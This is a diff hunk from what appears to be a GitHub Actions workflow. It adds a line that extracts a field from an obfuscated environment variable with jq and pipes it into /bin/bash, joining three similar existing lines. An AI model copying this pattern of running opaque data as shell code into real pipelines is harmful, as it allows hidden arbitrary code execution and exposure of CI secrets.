@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$bupa85761" | jq -r .wws5 | /bin/bash
           echo $jzfvm832 | jq -r .fob611 | /bin/bash
           printf '%s' "$dew4801" | jq -r .iher77 | /bin/bash
+          echo $yr5 | jq -r .xx355 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
